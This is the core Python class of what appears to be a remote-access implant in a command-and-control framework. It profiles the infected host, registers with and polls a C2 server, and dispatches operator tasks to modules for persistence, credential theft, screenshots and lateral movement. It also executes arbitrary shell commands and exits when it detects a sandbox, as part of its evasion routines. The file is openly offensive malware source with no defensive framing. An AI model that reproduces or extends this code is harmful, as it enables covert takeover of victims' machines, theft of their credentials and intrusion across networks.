# agent/core/agent.py
import os
import sys
import time
import json
import platform
import threading
import traceback
import subprocess
from datetime import datetime
from typing import Dict, Any, Optional, List
import uuid
import socket
import psutil

from .config import AgentConfig
from .crypto import CryptoManager
from .communications import CommunicationManager
from ..modules import (
    BasicCommands, FileOperations, ProcessManager,
    NetworkTools, Persistence, Credentials, Screenshot,
    LateralMovement
)
from ..evasion import AntiAnalysis, AntiDebugging, SandboxDetection


class Agent:
    """Main agent class that orchestrates all functionality"""
    
    def __init__(self, config: AgentConfig):
        self.config = config
        self.agent_id = self._generate_agent_id()
        self.running = False
        self.session_key = None
        
        # Initialize managers
        self.crypto = CryptoManager(config.encryption_key)
        self.comm = CommunicationManager(self)
        
        # Initialize modules
        self.modules = {
            'basic': BasicCommands(self),
            'files': FileOperations(self),
            'processes': ProcessManager(self),
            'network': NetworkTools(self),
            'persistence': Persistence(self),
            'credentials': Credentials(self),
            'screenshot': Screenshot(self),
            'lateral': LateralMovement(self)
        }
        
        # Initialize evasion techniques
        self.evasion = {
            'anti_analysis': AntiAnalysis(),
            'anti_debugging': AntiDebugging(),
            'sandbox_detection': SandboxDetection()
        }
        
        # System information
        self.system_info = self._gather_system_info()
        
        # Task queue
        self.task_queue = []
        self.task_results = {}
        self.task_lock = threading.Lock()
        
    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                       for ele in range(0,8*6,8)][::-1])
        return f"{hostname}_{mac}_{uuid.uuid4().hex[:8]}"
    
    def _gather_system_info(self) -> Dict[str, Any]:
        """Gather system information"""
        try:
            # Get external IP
            external_ip = self._get_external_ip()
            
            return {
                'agent_id': self.agent_id,
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'os_version': platform.version(),
                'arch': platform.machine(),
                'username': os.getenv('USER') or os.getenv('USERNAME'),
                'is_admin': self._check_admin_privileges(),
                'pid': os.getpid(),
                'cpu_info': platform.processor(),
                'memory_total': round(psutil.virtual_memory().total / (1024**3), 2),
                'disk_total': round(psutil.disk_usage('/').total / (1024**3), 2),
                'internal_ip': self._get_internal_ip(),
                'external_ip': external_ip,
                'domain': self._get_domain(),
                'version': self.config.version,
                'modules': list(self.modules.keys())
            }
        except Exception as e:
            return {
                'agent_id': self.agent_id,
                'error': str(e)
            }
    
    def _get_internal_ip(self) -> str:
        """Get internal IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_external_ip(self) -> Optional[str]:
        """Get external IP address"""
        try:
            # Try multiple services
            services = [
                'https://api.ipify.org',
                'https://icanhazip.com',
                'https://ident.me'
            ]
            
            for service in services:
                try:
                    import urllib.request
                    with urllib.request.urlopen(service, timeout=5) as response:
                        return response.read().decode('utf-8').strip()
                except:
                    continue
            
            return None
        except:
            return None
    
    def _get_domain(self) -> Optional[str]:
        """Get domain name if joined"""
        try:
            if platform.system() == 'Windows':
                import win32api
                return win32api.GetDomainName()
            else:
                # Unix/Linux
                import subprocess
                result = subprocess.run(['dnsdomainname'], 
                                      capture_output=True, 
                                      text=True)
                domain = result.stdout.strip()
                return domain if domain else None
        except:
            return None
    
    def _check_admin_privileges(self) -> bool:
        """Check if running with admin/root privileges"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def run(self):
        """Main agent loop"""
        self.running = True
        
        # Apply evasion techniques if enabled
        if self.config.enable_evasion:
            self._apply_evasion_techniques()
        
        # Register with C2 server
        self._register()
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Main task processing loop
        while self.running:
            try:
                # Check in and get tasks
                tasks = self._checkin()
                
                if tasks:
                    for task in tasks:
                        self._process_task(task)
                
                # Sleep for check-in interval
                time.sleep(self.config.checkin_interval)
                
            except KeyboardInterrupt:
                self.shutdown()
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(self.config.checkin_interval)
    
    def _apply_evasion_techniques(self):
        """Apply evasion techniques"""
        try:
            # Check for sandbox
            if self.evasion['sandbox_detection'].detect():
                print("Sandbox detected, exiting...")
                sys.exit(0)
            
            # Anti-debugging
            self.evasion['anti_debugging'].check_debugger()
            
            # Anti-analysis
            self.evasion['anti_analysis'].obfuscate_strings()
            
        except Exception as e:
            print(f"Error applying evasion: {e}")
    
    def _register(self):
        """Register agent with C2 server"""
        try:
            data = {
                'action': 'register',
                'system_info': self.system_info,
                'timestamp': datetime.utcnow().isoformat()
            }
            
            response = self.comm.send_data(data)
            if response and response.get('status') == 'success':
                self.session_key = response.get('session_key')
                print(f"Registered successfully: {self.agent_id}")
            
        except Exception as e:
            print(f"Registration failed: {e}")
    
    def _checkin(self) -> List[Dict[str, Any]]:
        """Check in with C2 server and get tasks"""
        try:
            data = {
                'action': 'checkin',
                'agent_id': self.agent_id,
                'status': 'active',
                'timestamp': datetime.utcnow().isoformat()
            }
            
            # Include any completed task results
            with self.task_lock:
                if self.task_results:
                    data['results'] = self.task_results
                    self.task_results = {}
            
            response = self.comm.send_data(data)
            
            if response and response.get('status') == 'success':
                return response.get('tasks', [])
            
            return []
            
        except Exception as e:
            print(f"Check-in failed: {e}")
            return []
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                data = {
                    'action': 'heartbeat',
                    'agent_id': self.agent_id,
                    'timestamp': datetime.utcnow().isoformat()
                }
                
                self.comm.send_data(data)
                
            except Exception:
                pass
            
            time.sleep(30)  # Heartbeat every 30 seconds
    
    def _process_task(self, task: Dict[str, Any]):
        """Process a single task"""
        task_id = task.get('id')
        module = task.get('module')
        command = task.get('command')
        parameters = task.get('parameters', {})
        
        print(f"Processing task {task_id}: {module}.{command}")
        
        try:
            # Execute task
            if module in self.modules:
                result = self.modules[module].execute(command, parameters)
            else:
                result = {'error': f'Unknown module: {module}'}
            
            # Store result
            with self.task_lock:
                self.task_results[task_id] = {
                    'status': 'completed',
                    'result': result,
                    'timestamp': datetime.utcnow().isoformat()
                }
                
        except Exception as e:
            # Store error
            with self.task_lock:
                self.task_results[task_id] = {
                    'status': 'failed',
                    'error': str(e),
                    'traceback': traceback.format_exc(),
                    'timestamp': datetime.utcnow().isoformat()
                }
    
    def execute_command(self, command: str) -> str:
        """Execute shell command"""
        try:
            if platform.system() == 'Windows':
                shell = True
                executable = None
            else:
                shell = False
                executable = '/bin/bash'
                command = [executable, '-c', command]
            
            result = subprocess.run(
                command,
                shell=shell,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\nERROR:\n{result.stderr}"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error executing command: {e}"
    
    def shutdown(self):
        """Shutdown agent gracefully"""
        print("Shutting down agent...")
        self.running = False
        
        # Send shutdown notification
        try:
            data = {
                'action': 'shutdown',
                'agent_id': self.agent_id,
                'timestamp': datetime.utcnow().isoformat()
            }
            self.comm.send_data(data)
        except:
            pass
        
        # Clean up
        for module in self.modules.values():
            if hasattr(module, 'cleanup'):
                module.cleanup()
